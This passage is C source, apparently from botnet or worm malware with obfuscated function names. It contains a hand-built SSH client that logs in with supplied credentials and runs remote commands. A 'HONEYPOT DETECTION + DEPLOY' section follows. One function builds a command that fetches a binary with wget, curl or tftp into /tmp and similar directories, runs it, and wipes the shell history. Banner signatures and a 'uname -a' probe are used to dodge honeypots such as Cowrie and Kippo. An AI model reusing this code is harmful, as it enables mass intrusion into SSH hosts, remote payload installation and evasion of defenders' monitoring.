        ssh_sha1_final(&ctx, hash);
        if (out_len <= 20) {
            memcpy(out, hash, out_len);
        } else {
            memcpy(out, hash, 20);
        }
    } else {
        _BW4EK8x ctx;
        uint8_t hash[32];
        _tP5sQ3C(&ctx);
        _iS7pL8N(&ctx, klen_be, 4);
        _iS7pL8N(&ctx, K, Klen);
        _iS7pL8N(&ctx, H, 32);
        _iS7pL8N(&ctx, &letter, 1);
        _iS7pL8N(&ctx, session_id, 32);
        _Vd5Ph6z(&ctx, hash);
        if (out_len <= 32) {
            memcpy(out, hash, out_len);
        } else {
            memcpy(out, hash, 32);
        }
    }
}

/* Full SSH handshake: banner + kexinit + DH + newkeys + service request */
static int _ms4KB8R(_Rz8vk8z *c) {
    uint8_t sbanner[256];
    uint8_t payload[SSH_MAX_PACKET];
    uint8_t client_kexinit[512];
    int client_kexinit_len;
    uint8_t server_kexinit[SSH_MAX_PACKET];
    int server_kexinit_len;
    bn_t x, e, f, K, p;
    uint8_t e_bytes[DH14_SIZE + 1];
    int e_len;
    uint8_t K_bytes[DH14_SIZE + 1];
    int K_len;
    uint8_t H[32];
    int plen;
    int slen;
    uint8_t saved_host_key[1024];
    uint32_t saved_host_key_len = 0;
    uint8_t f_raw[DH14_SIZE + 1];
    int f_raw_len = 0;
    /* Curve25519 variables */
    uint8_t c25519_priv[32], c25519_pub[32], c25519_shared[32];
    uint8_t c25519_server_pub[32];

    /* 1. Send client banner */
    if (ssh_write_raw(c, (const uint8_t *)ssh_client_banner, strlen(ssh_client_banner)) < 0)
        return -1;

    /* 2. Read server banner */
    {
        int i = 0;
        while (i < (int)sizeof(sbanner) - 1) {
            struct pollfd pfd;
            pfd.fd = c->fd; pfd.events = POLLIN;
            if (poll(&pfd, 1, SSH_READ_TIMEOUT * 1000) <= 0) return -1;
            if (read(c->fd, sbanner + i, 1) != 1) return -1;
            if (sbanner[i] == '\n') { i++; break; }
            i++;
        }
        sbanner[i] = '\0';
        slen = i;
        /* strip \r\n */
        while (slen > 0 && (sbanner[slen-1] == '\r' || sbanner[slen-1] == '\n')) slen--;
        sbanner[slen] = '\0';
        if (strncmp((char*)sbanner, "SSH-2.0-", 8) != 0) return -1;
        { int blen = slen < (int)sizeof(c->banner)-1 ? slen : (int)sizeof(c->banner)-1;
          memcpy(c->banner, sbanner, blen); c->banner[blen] = '\0'; }
        SSH_DBG("server banner: %s", sbanner);
    }

    /* 3. Send KEXINIT */
    client_kexinit_len = _dU6Up5e(client_kexinit);
    if (ssh_send_packet(c, client_kexinit, client_kexinit_len) < 0) return -1;

    /* 4. Receive server KEXINIT */
    server_kexinit_len = _ay7CX5V(c, server_kexinit, sizeof(server_kexinit));
    if (server_kexinit_len < 0 || server_kexinit[0] != SSH_MSG_KEXINIT) return -1;

    /* 4b. Select kex algorithm based on server's offer */
    c->kex_algo = ssh_select_kex(server_kexinit, server_kexinit_len);
    if (c->kex_algo == KEX_NONE) return -2; /* no common kex algorithm */
    if (c->kex_algo == KEX_CURVE25519_SHA256 || c->kex_algo == KEX_DH_GROUP14_SHA256)
        c->hash_len = 32;
    else
        c->hash_len = 20; /* SHA-1 for group14-sha1 and group1-sha1 */

    if (c->kex_algo == KEX_CURVE25519_SHA256) {
        /* ---- Curve25519 KEX (RFC 8731) ---- */

        /* Generate ephemeral keypair using existing crypto.c X25519 */
        urandom_bytes(c25519_priv, 32);
        _go6pR4p(c25519_pub, c25519_priv);

        /* Send KEX_ECDH_INIT: string Q_C (32 bytes) */
        {
            uint8_t ecdh_init[64];
            int dpos = 0;
            uint32_t qlen = 32;
            ecdh_init[dpos++] = SSH_MSG_KEXDH_INIT;
            ecdh_init[dpos++] = (uint8_t)(qlen >> 24);
            ecdh_init[dpos++] = (uint8_t)(qlen >> 16);
            ecdh_init[dpos++] = (uint8_t)(qlen >> 8);
            ecdh_init[dpos++] = (uint8_t)qlen;
            memcpy(ecdh_init + dpos, c25519_pub, 32);
            dpos += 32;
            if (ssh_send_packet(c, ecdh_init, dpos) < 0) return -1;
        }

        /* Receive KEX_ECDH_REPLY */
        plen = _ay7CX5V(c, payload, sizeof(payload));
        if (plen < 0 || payload[0] != SSH_MSG_KEXDH_REPLY) return -1;

        /* Parse: host_key(string) + Q_S(string, 32 bytes) + signature(string) */
        {
            int rpos = 1;
            uint32_t hk_len, qs_len;

            if (rpos + 4 > plen) return -1;
            hk_len = ((uint32_t)payload[rpos]<<24)|((uint32_t)payload[rpos+1]<<16)|
                     ((uint32_t)payload[rpos+2]<<8)|(uint32_t)payload[rpos+3];
            if (hk_len <= sizeof(saved_host_key)) {
                memcpy(saved_host_key, payload + rpos + 4, hk_len);
                saved_host_key_len = hk_len;
            }
            rpos += 4 + (int)hk_len;

            if (rpos + 4 > plen) return -1;
            qs_len = ((uint32_t)payload[rpos]<<24)|((uint32_t)payload[rpos+1]<<16)|
                     ((uint32_t)payload[rpos+2]<<8)|(uint32_t)payload[rpos+3];
            rpos += 4;
            if (qs_len != 32 || rpos + 32 > plen) return -1;
            memcpy(c25519_server_pub, payload + rpos, 32);
        }

        /* Compute shared secret */
        _aw4Ma4u(c25519_shared, c25519_priv, c25519_server_pub);

        /* Encode shared secret as SSH mpint — raw byte order per OpenSSH convention */
        {
            uint8_t K_be[33];
            int i, start;
            for (i = 0; i < 32; i++) K_be[i + 1] = c25519_shared[i];
            start = 1;
            while (start < 32 && K_be[start] == 0) start++;
            if (K_be[start] & 0x80) { start--; K_be[start] = 0; }
            K_len = 33 - start;
            memcpy(K_bytes, K_be + start, (size_t)K_len);
        }

        /* Compute exchange hash H (SHA-256) */
        {
            _BW4EK8x hctx;
            uint8_t lbuf[4];
            uint32_t vc_len = (uint32_t)strlen(ssh_client_banner) - 2;

            _tP5sQ3C(&hctx);

#define HASH_STR(data, len) do { \
    uint32_t _l = (uint32_t)(len); \
    lbuf[0]=(uint8_t)(_l>>24); lbuf[1]=(uint8_t)(_l>>16); \
    lbuf[2]=(uint8_t)(_l>>8); lbuf[3]=(uint8_t)_l; \
    _iS7pL8N(&hctx, lbuf, 4); \
    _iS7pL8N(&hctx, (const uint8_t *)(data), _l); \
} while(0)

            HASH_STR(ssh_client_banner, vc_len);
            HASH_STR(sbanner, slen);
            HASH_STR(client_kexinit, client_kexinit_len);
            HASH_STR(server_kexinit, server_kexinit_len);
            HASH_STR(saved_host_key, saved_host_key_len);
            HASH_STR(c25519_pub, 32);
            HASH_STR(c25519_server_pub, 32);
            HASH_STR(K_bytes, K_len);

#undef HASH_STR

            _Vd5Ph6z(&hctx, H);
        }
    } else {
        /* ---- Classic DH KEX ---- */

        if (c->kex_algo == KEX_DH_GROUP1_SHA1)
            bn_from_bytes(&p, dh1_p, DH1_SIZE);
        else
            bn_from_bytes(&p, dh14_p, DH14_SIZE);

        /* Generate private key x (256 bits) */
        {
            uint8_t xbuf[32];
            urandom_bytes(xbuf, 32);
            bn_from_bytes(&x, xbuf, 32);
        }

        /* e = g^x mod p */
        {
            bn_t g;
            bn_from_u32(&g, dh14_g);
            bn_modexp(&e, &g, &x, &p);
        }
        e_len = bn_to_bytes(&e, e_bytes + 1, DH14_SIZE);
        if (e_bytes[1] & 0x80) { e_bytes[0] = 0; e_len++; }
        else { memmove(e_bytes, e_bytes + 1, e_len); }

        /* Send KEXDH_INIT (e as mpint) */
        {
            uint8_t dh_init[DH14_SIZE + 10];
            int dpos = 0;
            dh_init[dpos++] = SSH_MSG_KEXDH_INIT;
            dh_init[dpos++] = (uint8_t)(e_len >> 24);
            dh_init[dpos++] = (uint8_t)(e_len >> 16);
            dh_init[dpos++] = (uint8_t)(e_len >> 8);
            dh_init[dpos++] = (uint8_t)e_len;
            memcpy(dh_init + dpos, e_bytes, e_len);
            dpos += e_len;
            if (ssh_send_packet(c, dh_init, dpos) < 0) return -1;
        }

        /* Receive KEXDH_REPLY */
        plen = _ay7CX5V(c, payload, sizeof(payload));
        if (plen < 0 || payload[0] != SSH_MSG_KEXDH_REPLY) return -1;

        /* Parse: host_key(string) + f(mpint) + signature(string) */
        {
            int rpos = 1;
            uint32_t hk_len, f_len;
            uint8_t f_bytes[DH14_SIZE + 1];

            if (rpos + 4 > plen) return -1;
            hk_len = ((uint32_t)payload[rpos]<<24)|((uint32_t)payload[rpos+1]<<16)|
                     ((uint32_t)payload[rpos+2]<<8)|(uint32_t)payload[rpos+3];
            if (hk_len <= sizeof(saved_host_key)) {
                memcpy(saved_host_key, payload + rpos + 4, hk_len);
                saved_host_key_len = hk_len;
            }
            rpos += 4 + hk_len;

            if (rpos + 4 > plen) return -1;
            f_len = ((uint32_t)payload[rpos]<<24)|((uint32_t)payload[rpos+1]<<16)|
                    ((uint32_t)payload[rpos+2]<<8)|(uint32_t)payload[rpos+3];
            rpos += 4;
            if (f_len > DH14_SIZE + 1 || rpos + (int)f_len > plen) return -1;
            memcpy(f_bytes, payload + rpos, f_len);
            memcpy(f_raw, f_bytes, f_len);
            f_raw_len = (int)f_len;

            if (f_bytes[0] == 0 && f_len > 1)
                bn_from_bytes(&f, f_bytes + 1, f_len - 1);
            else
                bn_from_bytes(&f, f_bytes, f_len);

            /* K = f^x mod p */
            bn_modexp(&K, &f, &x, &p);
        }
        K_len = bn_to_bytes(&K, K_bytes + 1, DH14_SIZE);
        if (K_bytes[1] & 0x80) { K_bytes[0] = 0; K_len++; }
        else { memmove(K_bytes, K_bytes + 1, K_len); }

        /* 7. Compute exchange hash H */
        if (c->hash_len == 20) {
            ssh_sha1_ctx hctx;
            uint8_t lbuf[4];
            uint32_t vc_len = (uint32_t)strlen(ssh_client_banner) - 2;

            ssh_sha1_init(&hctx);

#define HASH_STRING(data, len) do { \
    uint32_t _l = (uint32_t)(len); \
    lbuf[0]=(uint8_t)(_l>>24); lbuf[1]=(uint8_t)(_l>>16); \
    lbuf[2]=(uint8_t)(_l>>8); lbuf[3]=(uint8_t)_l; \
    ssh_sha1_update(&hctx, lbuf, 4); \
    ssh_sha1_update(&hctx, (const uint8_t *)(data), _l); \
} while(0)

            HASH_STRING(ssh_client_banner, vc_len);
            HASH_STRING(sbanner, slen);
            HASH_STRING(client_kexinit, client_kexinit_len);
            HASH_STRING(server_kexinit, server_kexinit_len);
            HASH_STRING(saved_host_key, saved_host_key_len);
            HASH_STRING(e_bytes, e_len);
            HASH_STRING(f_raw, f_raw_len);
            HASH_STRING(K_bytes, K_len);

#undef HASH_STRING

            ssh_sha1_final(&hctx, H);
        } else {
            _BW4EK8x hctx;
            uint8_t lbuf[4];
            uint32_t vc_len = (uint32_t)strlen(ssh_client_banner) - 2;

            _tP5sQ3C(&hctx);

#define HASH_STRING(data, len) do { \
    uint32_t _l = (uint32_t)(len); \
    lbuf[0]=(uint8_t)(_l>>24); lbuf[1]=(uint8_t)(_l>>16); \
    lbuf[2]=(uint8_t)(_l>>8); lbuf[3]=(uint8_t)_l; \
    _iS7pL8N(&hctx, lbuf, 4); \
    _iS7pL8N(&hctx, (const uint8_t *)(data), _l); \
} while(0)

            HASH_STRING(ssh_client_banner, vc_len);
            HASH_STRING(sbanner, slen);
            HASH_STRING(client_kexinit, client_kexinit_len);
            HASH_STRING(server_kexinit, server_kexinit_len);
            HASH_STRING(saved_host_key, saved_host_key_len);
            HASH_STRING(e_bytes, e_len);
            HASH_STRING(f_raw, f_raw_len);
            HASH_STRING(K_bytes, K_len);

#undef HASH_STRING

            _Vd5Ph6z(&hctx, H);
        }
    }
    memcpy(c->session_id, H, c->hash_len);

    /* 8b. Detect cipher from server KEXINIT */
    {
        int coff = 17, ci;
        for (ci = 0; ci < 2 && coff + 4 <= server_kexinit_len; ci++) {
            uint32_t nl = ((uint32_t)server_kexinit[coff]<<24)|((uint32_t)server_kexinit[coff+1]<<16)|
                          ((uint32_t)server_kexinit[coff+2]<<8)|(uint32_t)server_kexinit[coff+3];
            coff += 4 + (int)nl;
        }
        { int off128 = coff;
          c->cipher_256 = _Cq8Hn7J((const char *)(server_kexinit + coff + 4), "aes128-ctr") ? 0 : 1;
          (void)off128; }
    }

    /* 8. Derive keys */
    {
        uint8_t iv_c2s[16], iv_s2c[16];
        int keylen = c->cipher_256 ? 32 : 16;
        uint8_t ekey[32], dkey[32];

        _kA7Bv2Y(K_bytes, K_len, H, 'A', c->session_id, iv_c2s, 16, c->hash_len);
        _kA7Bv2Y(K_bytes, K_len, H, 'B', c->session_id, iv_s2c, 16, c->hash_len);
        _kA7Bv2Y(K_bytes, K_len, H, 'C', c->session_id, ekey, keylen, c->hash_len);
        _kA7Bv2Y(K_bytes, K_len, H, 'D', c->session_id, dkey, keylen, c->hash_len);

        if (c->cipher_256) {
            aes256ctr_init(&c->enc256, ekey, iv_c2s);
            aes256ctr_init(&c->dec256, dkey, iv_s2c);
        } else {
            aes128ctr_init(&c->enc128, ekey, iv_c2s);
            aes128ctr_init(&c->dec128, dkey, iv_s2c);
        }
    }
    _kA7Bv2Y(K_bytes, K_len, H, 'E', c->session_id, c->enc_mac, c->hash_len, c->hash_len);
    _kA7Bv2Y(K_bytes, K_len, H, 'F', c->session_id, c->dec_mac, c->hash_len, c->hash_len);

    /* 9. Send NEWKEYS */
    {
        uint8_t nk = SSH_MSG_NEWKEYS;
        if (ssh_send_packet(c, &nk, 1) < 0) return -1;
    }

    /* 10. Receive NEWKEYS */
    plen = _ay7CX5V(c, payload, sizeof(payload));
    if (plen < 0 || payload[0] != SSH_MSG_NEWKEYS) return -1;

    c->encrypted = 1;

    /* 11. Request ssh-userauth service */
    {
        uint8_t sreq[64];
        int spos = 0;
        const char *svc = "ssh-userauth";
        uint32_t svc_len = (uint32_t)strlen(svc);
        sreq[spos++] = SSH_MSG_SERVICE_REQUEST;
        sreq[spos++] = (uint8_t)(svc_len >> 24);
        sreq[spos++] = (uint8_t)(svc_len >> 16);
        sreq[spos++] = (uint8_t)(svc_len >> 8);
        sreq[spos++] = (uint8_t)svc_len;
        memcpy(sreq + spos, svc, svc_len); spos += svc_len;
        if (ssh_send_packet(c, sreq, spos) < 0) return -1;
    }

    plen = _ay7CX5V(c, payload, sizeof(payload));
    if (plen < 0 || payload[0] != SSH_MSG_SERVICE_ACCEPT) return -1;

    SSH_DBG("handshake complete, encryption active");
    return 0;
}

/* ======================================================================
   SSH AUTH
   ====================================================================== */

/* Helper: build and send USERAUTH_REQUEST */
static int _LZ4Bb7E(_Rz8vk8z *c, const char *user,
                             const char *svc, const char *method,
                             const uint8_t *extra, int extra_len) {
    uint8_t pkt[512];
    int pos = 0;
    uint32_t ul=(uint32_t)strlen(user), sl=(uint32_t)strlen(svc), ml=(uint32_t)strlen(method);
    pkt[pos++]=SSH_MSG_USERAUTH_REQUEST;
    pkt[pos++]=(uint8_t)(ul>>24);pkt[pos++]=(uint8_t)(ul>>16);pkt[pos++]=(uint8_t)(ul>>8);pkt[pos++]=(uint8_t)ul;
    memcpy(pkt+pos,user,ul);pos+=(int)ul;
    pkt[pos++]=(uint8_t)(sl>>24);pkt[pos++]=(uint8_t)(sl>>16);pkt[pos++]=(uint8_t)(sl>>8);pkt[pos++]=(uint8_t)sl;
    memcpy(pkt+pos,svc,sl);pos+=(int)sl;
    pkt[pos++]=(uint8_t)(ml>>24);pkt[pos++]=(uint8_t)(ml>>16);pkt[pos++]=(uint8_t)(ml>>8);pkt[pos++]=(uint8_t)ml;
    memcpy(pkt+pos,method,ml);pos+=(int)ml;
    if (extra && extra_len > 0) { memcpy(pkt+pos,extra,(size_t)extra_len); pos+=extra_len; }
    return ssh_send_packet(c, pkt, pos);
}

/* Keyboard-interactive auth fallback */
static int _yC5xh5B(_Rz8vk8z *c, const char *user, const char *pass) {
    uint8_t payload[SSH_MAX_PACKET];
    uint8_t resp[512];
    int rlen, rpos, tries;
    uint32_t plen=(uint32_t)strlen(pass);

    { uint8_t extra[8]={0}; if (_LZ4Bb7E(c,user,"ssh-connection","keyboard-interactive",extra,8)<0) return -1; }

    for (tries=0;tries<5;tries++) {
        rlen=_ay7CX5V(c,payload,sizeof(payload));
        if (rlen<0) return -1;
        if (payload[0]==SSH_MSG_USERAUTH_SUCCESS) return 1;
        if (payload[0]==SSH_MSG_USERAUTH_FAILURE) return 0;
        if (payload[0]==SSH_MSG_USERAUTH_INFO_REQUEST) break;
    }
    if (payload[0]!=SSH_MSG_USERAUTH_INFO_REQUEST) return -1;

    rpos=1;
    { int si; for(si=0;si<3&&rpos+4<=rlen;si++) {
        uint32_t nl=((uint32_t)payload[rpos]<<24)|((uint32_t)payload[rpos+1]<<16)|
                    ((uint32_t)payload[rpos+2]<<8)|(uint32_t)payload[rpos+3];
        rpos+=4+(int)nl;
    }}

    { int p=0;
      resp[p++]=SSH_MSG_USERAUTH_INFO_RESPONSE;
      resp[p++]=0;resp[p++]=0;resp[p++]=0;resp[p++]=1;
      resp[p++]=(uint8_t)(plen>>24);resp[p++]=(uint8_t)(plen>>16);
      resp[p++]=(uint8_t)(plen>>8);resp[p++]=(uint8_t)plen;
      memcpy(resp+p,pass,plen);p+=(int)plen;
      if (ssh_send_packet(c,resp,p)<0) return -1; }

    for (tries=0;tries<5;tries++) {
        rlen=_ay7CX5V(c,payload,sizeof(payload));
        if (rlen<0) return -1;
        if (payload[0]==SSH_MSG_USERAUTH_SUCCESS) return 1;
        if (payload[0]==SSH_MSG_USERAUTH_FAILURE) return 0;
        if (payload[0]==SSH_MSG_USERAUTH_INFO_REQUEST) {
            uint8_t empty[5]={SSH_MSG_USERAUTH_INFO_RESPONSE,0,0,0,0};
            if (ssh_send_packet(c,empty,5)<0) return -1;
            continue;
        }
    }
    return -1;
}

/* Try password auth, fallback to keyboard-interactive. Returns: 1=success, 0=failure, -1=error */
static int _CC2fp3F(_Rz8vk8z *c, const char *user, const char *pass) {
    uint8_t payload[SSH_MAX_PACKET];
    int rlen;
    uint32_t plen=(uint32_t)strlen(pass);

    { uint8_t extra[260]; int ep=0;
      extra[ep++]=0;
      extra[ep++]=(uint8_t)(plen>>24);extra[ep++]=(uint8_t)(plen>>16);
      extra[ep++]=(uint8_t)(plen>>8);extra[ep++]=(uint8_t)plen;
      memcpy(extra+ep,pass,plen);ep+=(int)plen;
      if (_LZ4Bb7E(c,user,"ssh-connection","password",extra,ep)<0) return -1; }

    /* Read packets, skipping any GLOBAL_REQUEST (80), EXT_INFO (7), DEBUG (4)
     * that OpenSSH 9.x sends between auth request and auth response */
    { int tries=0;
      while (tries < 10) {
          rlen=_ay7CX5V(c,payload,sizeof(payload));
          if (rlen<0) return -1;
          if (payload[0]==SSH_MSG_USERAUTH_SUCCESS) return 1;
          if (payload[0]==SSH_MSG_USERAUTH_FAILURE) break;
          SSH_DBG("auth: skipping msg type=%d, waiting for auth response", payload[0]);
          tries++;
      }
    }

    if (payload[0]==SSH_MSG_USERAUTH_FAILURE && rlen>5) {
        uint32_t mlen=((uint32_t)payload[1]<<24)|((uint32_t)payload[2]<<16)|
                      ((uint32_t)payload[3]<<8)|(uint32_t)payload[4];
        if (mlen>0 && 5+(int)mlen<=rlen) {
            char methods[256];
            int cplen=(int)mlen<255?(int)mlen:255;
            memcpy(methods,payload+5,(size_t)cplen); methods[cplen]='\0';
            if (strstr(methods,"keyboard-interactive"))
                return _yC5xh5B(c,user,pass);
        }
        return 0;
    }
    return -1;
}

/* ======================================================================
   SSH EXEC — open channel + run command (fire-and-forget)
   ====================================================================== */

static int _nD6dS8V(_Rz8vk8z *c, const char *cmd) {
    uint8_t pkt[4096];
    uint8_t resp[SSH_MAX_PACKET];
    int pos, rlen;
    uint32_t cmd_len = (uint32_t)strlen(cmd);
    const char *ctype = "session";
    uint32_t ctype_len = 7;
    const char *req = "exec";
    uint32_t req_len = 4;

    /* CHANNEL_OPEN "session" */
    pos = 0;
    pkt[pos++] = SSH_MSG_CHANNEL_OPEN;
    /* channel type */
    pkt[pos++] = (uint8_t)(ctype_len >> 24); pkt[pos++] = (uint8_t)(ctype_len >> 16);
    pkt[pos++] = (uint8_t)(ctype_len >> 8); pkt[pos++] = (uint8_t)ctype_len;
    memcpy(pkt + pos, ctype, ctype_len); pos += ctype_len;
    /* sender channel (monotonic) */
    { uint32_t ch = c->next_chan++;
      pkt[pos++] = (uint8_t)(ch >> 24); pkt[pos++] = (uint8_t)(ch >> 16);
      pkt[pos++] = (uint8_t)(ch >> 8);  pkt[pos++] = (uint8_t)ch; }
    /* initial window = 64K */
    pkt[pos++] = 0; pkt[pos++] = 0x01; pkt[pos++] = 0; pkt[pos++] = 0;
    /* max packet = 32K */
    pkt[pos++] = 0; pkt[pos++] = 0; pkt[pos++] = 0x80; pkt[pos++] = 0;

    if (ssh_send_packet(c, pkt, pos) < 0) return -1;

    /* Read packets until we get CHANNEL_OPEN_CONFIRM (91) or CHANNEL_OPEN_FAILURE (92).
     * OpenSSH 9.x sends SSH_MSG_GLOBAL_REQUEST (80) for hostkeys-00@openssh.com
     * between auth and channel confirm — skip those. */
    { int tries = 0;
      while (tries < 10) {
          rlen = _ay7CX5V(c, resp, sizeof(resp));
          if (rlen < 0) return -1;
          if (resp[0] == SSH_MSG_CHANNEL_OPEN_CONFIRM) break;
          if (resp[0] == 92) { /* CHANNEL_OPEN_FAILURE */
              SSH_DBG("channel open rejected by server (reason in payload)");
              return -1;
          }
          SSH_DBG("channel open: skipping msg type=%d, waiting for confirm", resp[0]);
          tries++;
      }
      if (resp[0] != SSH_MSG_CHANNEL_OPEN_CONFIRM) {
          SSH_DBG("channel open failed: never got confirm (last type=%d)", resp[0]);
          return -1;
      }
    }

    /* CHANNEL_REQUEST "exec" (want_reply=false, fire and forget) */
    pos = 0;
    pkt[pos++] = SSH_MSG_CHANNEL_REQUEST;
    /* recipient channel (from server's confirm — bytes 5-8) */
    if (rlen >= 9) {
        pkt[pos++] = resp[5]; pkt[pos++] = resp[6];
        pkt[pos++] = resp[7]; pkt[pos++] = resp[8];
    } else {
        pkt[pos++] = 0; pkt[pos++] = 0; pkt[pos++] = 0; pkt[pos++] = 0;
    }
    /* request type "exec" */
    pkt[pos++] = (uint8_t)(req_len >> 24); pkt[pos++] = (uint8_t)(req_len >> 16);
    pkt[pos++] = (uint8_t)(req_len >> 8); pkt[pos++] = (uint8_t)req_len;
    memcpy(pkt + pos, req, req_len); pos += req_len;
    /* want_reply = false */
    pkt[pos++] = 0;
    /* command */
    pkt[pos++] = (uint8_t)(cmd_len >> 24); pkt[pos++] = (uint8_t)(cmd_len >> 16);
    pkt[pos++] = (uint8_t)(cmd_len >> 8); pkt[pos++] = (uint8_t)cmd_len;
    if (cmd_len + pos > sizeof(pkt)) return -1;
    memcpy(pkt + pos, cmd, cmd_len); pos += cmd_len;

    if (ssh_send_packet(c, pkt, pos) < 0) return -1;

    SSH_DBG("exec sent: %s", cmd);
    return 0;
}

/* ======================================================================
   HONEYPOT DETECTION + DEPLOY
   ====================================================================== */

/* Case-insensitive substring search */
static int _CF4Xg7k(const char *haystack, const char *needle) {
    int nlen = (int)strlen(needle);
    while (*haystack) {
        if (strncasecmp(haystack, needle, (size_t)nlen) == 0)
            return 1;
        haystack++;
    }
    return 0;
}

static const char *ssh_hp_sigs[] = {
    /* Self-identifying honeypots */
    "Cowrie", "Kippo", "HonSSH", "Glutton", "OpenCanary",
    /* Known honeypot transports / libraries */
    "SSH-2.0-paramiko", "SSH-2.0-libssh", "Twisted",
    "russh_", "ssh2js", "SSH-2.0-Go", "SSH-2.0-Parks",
    /* Vendor / appliance banners that are overwhelmingly honeypots */
    "SSH-2.0-CISCO_WLC", "SSH-2.0-Server", "SSH-2.0-MocanaSSH",
    /* NOTE: SSH-1.99 and OpenSSH_4.x removed — too many false positives
       on real embedded/legacy devices. */
};

/* Passive honeypot check on SSH server banner. */
static int _mn4es3f(_Rz8vk8z *c) {
    int i;
    if (!c->banner[0]) return 0;
    for (i = 0; i < (int)(sizeof(ssh_hp_sigs)/sizeof(ssh_hp_sigs[0])); i++) {
        if (_CF4Xg7k(c->banner, ssh_hp_sigs[i]))
            return 1;
    }
    return 0;
}

/* Deploy binary via wget/curl/tftp chain.
   Single command with || fallback across dirs so the remote shell handles it.
   Returns 1 if command sent, 0 on send failure. */
static int _Cb5rB3s(_Rz8vk8z *c, const char *url, int clean) {
    static const char *dirs[] = { "/tmp", "/var/run", "/dev/shm", "/root", "/" };
    const char *tail = clean
        ? "; rm -f .d); history -c 2>/dev/null; > ~/.bash_history 2>/dev/null"
        : "); history -c 2>/dev/null; > ~/.bash_history 2>/dev/null";
    char cmd[4096];
    int pos = 0;
    int d, first = 1;

    for (d = 0; d < (int)(sizeof(dirs)/sizeof(dirs[0])); d++) {
        const char *dir = dirs[d];
        if (!first)
            pos += snprintf(cmd + pos, sizeof(cmd) - (size_t)pos, " || ");
        first = 0;
        pos += snprintf(cmd + pos, sizeof(cmd) - (size_t)pos,
            "(cd %s && (wget %s -O .d 2>/dev/null || curl -s %s -o .d 2>/dev/null || "
            "tftp -g -r .d -l .d %s 2>/dev/null) && chmod +x .d && ./.d%s",
            dir, url, url, url, tail);
        if (pos >= (int)sizeof(cmd) - 1) break;
    }

    return _nD6dS8V(c, cmd) == 0 ? 1 : 0;
}

/* Execute command and read channel data response.
   Returns bytes read into out_buf, or -1 on error. */
static int _Rz2Pm4g(_Rz8vk8z *c, const char *cmd,
                         char *out_buf, int out_sz) {
    uint8_t pkt[1024];
    uint8_t resp[SSH_MAX_PACKET];
    int pos, rlen;
    uint32_t cmd_len = (uint32_t)strlen(cmd);
    const char *ctype = "session";
    uint32_t ctype_len = 7;
    const char *req = "exec";
    uint32_t req_len = 4;
    uint8_t recv_chan[4];
    int out_pos = 0;

    if (out_buf && out_sz > 0) out_buf[0] = '\0';

    /* CHANNEL_OPEN "session" */
    pos = 0;
    pkt[pos++] = SSH_MSG_CHANNEL_OPEN;
    pkt[pos++] = (uint8_t)(ctype_len >> 24); pkt[pos++] = (uint8_t)(ctype_len >> 16);
    pkt[pos++] = (uint8_t)(ctype_len >> 8); pkt[pos++] = (uint8_t)ctype_len;
    memcpy(pkt + pos, ctype, ctype_len); pos += (int)ctype_len;
    { uint32_t ch = c->next_chan++;
      pkt[pos++] = (uint8_t)(ch >> 24); pkt[pos++] = (uint8_t)(ch >> 16);
      pkt[pos++] = (uint8_t)(ch >> 8);  pkt[pos++] = (uint8_t)ch; }
    pkt[pos++] = 0; pkt[pos++] = 0x01; pkt[pos++] = 0; pkt[pos++] = 0;
    pkt[pos++] = 0; pkt[pos++] = 0; pkt[pos++] = 0x80; pkt[pos++] = 0;

    if (ssh_send_packet(c, pkt, pos) < 0) return -1;

    { int t = 0;
      while (t < 10) {
          rlen = _ay7CX5V(c, resp, sizeof(resp));
          if (rlen < 0) return -1;
          if (resp[0] == SSH_MSG_CHANNEL_OPEN_CONFIRM) break;
          t++;
      }
      if (resp[0] != SSH_MSG_CHANNEL_OPEN_CONFIRM) return -1;
    }

    if (rlen >= 9) {
        recv_chan[0] = resp[5]; recv_chan[1] = resp[6];
        recv_chan[2] = resp[7]; recv_chan[3] = resp[8];
    } else {
        memset(recv_chan, 0, 4);
    }

    /* CHANNEL_REQUEST "exec" */
    pos = 0;
    pkt[pos++] = SSH_MSG_CHANNEL_REQUEST;
    memcpy(pkt + pos, recv_chan, 4); pos += 4;
    pkt[pos++] = (uint8_t)(req_len >> 24); pkt[pos++] = (uint8_t)(req_len >> 16);
    pkt[pos++] = (uint8_t)(req_len >> 8); pkt[pos++] = (uint8_t)req_len;
    memcpy(pkt + pos, req, req_len); pos += (int)req_len;
    pkt[pos++] = 0; /* want_reply = false */
    pkt[pos++] = (uint8_t)(cmd_len >> 24); pkt[pos++] = (uint8_t)(cmd_len >> 16);
    pkt[pos++] = (uint8_t)(cmd_len >> 8); pkt[pos++] = (uint8_t)cmd_len;
    if (cmd_len + (uint32_t)pos > sizeof(pkt)) return -1;
    memcpy(pkt + pos, cmd, cmd_len); pos += (int)cmd_len;

    if (ssh_send_packet(c, pkt, pos) < 0) return -1;

    { int tries = 0;
      while (tries < 15 && out_pos < out_sz - 1) {
          rlen = _ay7CX5V(c, resp, sizeof(resp));
          if (rlen <= 0) break;
          if (resp[0] == 94 && rlen > 9) {
              uint32_t dlen = ((uint32_t)resp[5] << 24) | ((uint32_t)resp[6] << 16) |
                              ((uint32_t)resp[7] << 8) | (uint32_t)resp[8];
              int cplen = (int)dlen;
              if (cplen > rlen - 9) cplen = rlen - 9;
              if (cplen > out_sz - 1 - out_pos) cplen = out_sz - 1 - out_pos;
              memcpy(out_buf + out_pos, resp + 9, (size_t)cplen);
              out_pos += cplen;
              break;
          }
          if (resp[0] == 95 && rlen > 13) {
              uint32_t dlen = ((uint32_t)resp[9] << 24) | ((uint32_t)resp[10] << 16) |
                              ((uint32_t)resp[11] << 8) | (uint32_t)resp[12];
              int cplen = (int)dlen;
              if (cplen > rlen - 13) cplen = rlen - 13;
              if (cplen > out_sz - 1 - out_pos) cplen = out_sz - 1 - out_pos;
              memcpy(out_buf + out_pos, resp + 13, (size_t)cplen);
              out_pos += cplen;
              break;
          }
          if (resp[0] == 96 || resp[0] == 97) break;
          tries++;
      }
    }

    if (out_buf) out_buf[out_pos] = '\0';
    return out_pos;
}

/* Active shell probe: graduated checks to verify real shell.
   Returns 1 = real shell, 0 = honeypot/fake. */
static int _qP4pj8f(_Rz8vk8z *c) {
    char resp[1024];
    int n;
    int uname_ok = 0;

    /* ch[0]: uname -a — must start with "Linux " to be credible */
    n = _Rz2Pm4g(c, "uname -a", resp, (int)sizeof(resp));
    if (n > 5 && strncmp(resp, "Linux ", 6) == 0) {
        if (_CF4Xg7k(resp, "cowrie") || _CF4Xg7k(resp, "kippo") ||
            _CF4Xg7k(resp, "svr04"))
            return 0;
        uname_ok = 1;
    }

    /* ch[1]: /proc/version (uname fallback) + honeypot dir listing */
